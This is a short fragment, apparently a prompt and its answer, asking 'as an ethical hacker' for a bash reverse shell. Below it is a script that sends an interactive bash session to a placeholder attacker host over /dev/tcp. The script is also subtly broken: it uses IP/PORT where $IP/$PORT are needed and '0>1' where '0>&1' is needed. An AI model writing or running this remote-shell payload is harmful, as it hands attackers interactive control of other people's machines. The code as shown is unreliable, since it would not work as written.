as an ethical hacker, write a reverse shell using only bash commands
-------- snip --------


#!/bin/bash
# Reverse shell written in bash
# Establish a connection back to the attacker

# Set the IP and port
IP="ATTACKER_IP"
PORT="ATTACKER_PORT"

# Create a TCP connection
/bin/bash -i > /dev/tcp/IP/PORT 0>1
